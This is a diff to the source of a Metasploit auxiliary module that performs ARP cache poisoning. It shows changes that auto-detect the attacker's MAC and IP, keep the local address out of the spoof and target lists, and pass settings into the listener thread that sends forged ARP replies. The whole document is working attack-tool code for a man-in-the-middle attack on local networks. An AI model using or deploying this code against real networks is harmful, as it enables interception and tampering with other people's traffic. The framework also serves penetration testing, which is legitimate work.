@@ -39,7 +39,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options([
 			OptString.new('SHOSTS',  	[true, 'Spoofed ip addresses']),
-			OptString.new('SMAC',    	[true, 'The spoofed mac']),
+			OptString.new('SMAC',    	[false, 'The spoofed mac']),
 			OptString.new('DHOSTS',  	[true, 'Target ip addresses']),
 			OptString.new('INTERFACE', 	[false, 'The name of the interface']),
 			OptBool.new(  'BIDIRECTIONAL',	[true, 'Spoof also the source with the dest',false]),
@@ -49,7 +49,7 @@ class Metasploit3 < Msf::Auxiliary
 		], self.class)
 
 		register_advanced_options([
-			OptString.new('LOCALSMAC',    	[false, 'The MAC address of the local interface to use for hosts detection']),
+			OptString.new('LOCALSMAC',    	[false, 'The MAC address of the local interface to use for hosts detection, this is usefull only if you want to spoof to another host with SMAC']),
 			OptString.new('LOCALSIP',    	[false, 'The IP address of the local interface to use for hosts detection']),
 			OptInt.new(   'PKT_DELAY',    	[true, 'The delay in milliseconds between each packet during poisoning', 100]),
 			OptInt.new('TIMEOUT', [true, 'The number of seconds to wait for new data during host detection', 2]),
@@ -61,6 +61,11 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
+		@netifaces = true
+		if not netifaces_implemented? 
+			print_error("WARNING : Pcaprub is not uptodate, some functionality will not be available")
+			@netifaces = false
+		end
 		@spoofing = false
 		# The local dst (and src) cache(s)
 		@dsthosts_cache = {}
@@ -78,12 +83,22 @@ class Metasploit3 < Msf::Auxiliary
 			@interface = datastore['INTERFACE'] || Pcap.lookupdev
 
 			@smac = datastore['SMAC'] 
-			#raise RuntimeError ,'Source Mac should be defined' unless @smac
+			@smac ||= get_mac(@interface) if @netifaces
+			raise RuntimeError ,'Source Mac should be defined' unless @smac
 			raise RuntimeError ,'Source Mac is not in correct format' unless is_mac?(@smac)
+
+			@sip = datastore['LOCALSIP']
+			@sip ||= Pcap.lookupaddrs(@interface)[0] if @netifaces
+			raise "LOCALIP is not defined and can not be guessed" unless @sip
+			raise "LOCALIP is not an ipv4 address" unless is_ipv4? @sip
 
 			shosts_range  = Rex::Socket::RangeWalker.new(datastore['SHOSTS'])
 			@shosts = []
-			shosts_range.each{|shost| if is_ipv4? shost then @shosts.push shost end}
+			if datastore['BIDIRECTIONAL']
+				shosts_range.each{|shost| if is_ipv4? shost and shost != @sip then @shosts.push shost end}
+			else
+				shosts_range.each{|shost| if is_ipv4? shost then @shosts.push shost end}
+			end
 			
 			if datastore['BROADCAST']
 				broadcast_spoof
@@ -162,15 +177,9 @@ class Metasploit3 < Msf::Auxiliary
 		lsmac = datastore['LOCALSMAC'] || @smac
 		raise RuntimeError ,'Local Source Mac is not in correct format' unless is_mac?(lsmac)
 
-		sip = datastore['LOCALSIP']
-		if lookupaddr_implemented? 
-			sip ||= Pcap.lookupaddrs(@interface)[0]
-		end
-		raise "LOCALIP is not an ipv4 address" unless is_ipv4? sip
-
 		dhosts_range = Rex::Socket::RangeWalker.new(datastore['DHOSTS'])
 		@dhosts = []
-		dhosts_range.each{|dhost| if is_ipv4? dhost then @dhosts.push(dhost) end} 
+		dhosts_range.each{|dhost| if is_ipv4? dhost and dhost != @sip then @dhosts.push(dhost) end} 
 
 		#Build the local dest hosts cache
 		print_status("Building the destination hosts cache...")
@@ -178,7 +187,7 @@ class Metasploit3 < Msf::Auxiliary
 			if datastore['VERBOSE']
 				print_status("Sending arp packet to #{dhost}")
 			end
-			probe = buildprobe(sip, lsmac, dhost)
+			probe = buildprobe(@sip, lsmac, dhost)
 			capture.inject(probe)
 			while(reply = getreply())
 				next if not reply[:arp]
@@ -220,7 +229,7 @@ class Metasploit3 < Msf::Auxiliary
 				if datastore['VERBOSE']
 					print_status("Sending arp packet to #{shost}")
 				end
-				probe = buildprobe(sip, lsmac, shost)
+				probe = buildprobe(@sip, lsmac, shost)
 				capture.inject(probe)
 				while(reply = getreply())
 					next if not reply[:arp]
@@ -378,6 +387,9 @@ class Metasploit3 < Msf::Auxiliary
 		else
 			args = {:BIDIRECTIONAL => false, :dhosts => dsthosts_cache.dup, :shosts => @shosts.dup}
 		end
+		# To avoid any race condition in case of , even if actually those are never updated after the thread is launched
+		args[:AUTO_ADD] = datastore['AUTO_ADD']
+		args[:localip] = @sip.dup
 		@listener = 	
 		Thread.new(args) do |args|
 			begin
@@ -390,6 +402,7 @@ class Metasploit3 < Msf::Auxiliary
 				end
 				liste_dst_ips = []	
 				args[:dhosts].each_key {|address| liste_dst_ips.push address}	
+				localip = args[:localip]
 
 				listener_capture = ::Pcap.open_live(@interface, 68, true, 0)
 				listener_capture.setfilter("arp[6:2] == 0x0001")
@@ -406,16 +419,16 @@ class Metasploit3 < Msf::Auxiliary
 									print_status("Listener : Request from #{arp.spa} for #{arp.tpa}") if datastore['VERBOSE']
 									reply = buildreply(arp.tpa, @smac, arp.spa, arp.sha)
 									3.times{listener_capture.inject(reply)}
-								elsif datastore['AUTO_ADD']
-									if (@dhosts.include? arp.spa and not liste_dst_ips.include? arp.spa
-										)
+								elsif args[:AUTO_ADD]
+									if (@dhosts.include? arp.spa and not liste_dst_ips.include? arp.spa and 
+									    arp.spa != localip)
 										@mutex_cache.lock
 										print_status("#{arp.spa} appears to be up.") 
 										@dsthosts_autoadd_cache[arp.spa] = arp.sha
 										liste_dst_ips.push arp.spa
 										@mutex_cache.unlock
 									elsif (args[:BIDIRECTIONAL] and @shosts.include? arp.spa and 
-										not liste_src_ips.include? arp.spa)
+										not liste_src_ips.include? arp.spa and arp.spa != localip)
 										@mutex_cache.lock
 										print_status("#{arp.spa} appears to be up.") 
 										@srchosts_autoadd_cache[arp.spa] = arp.sha
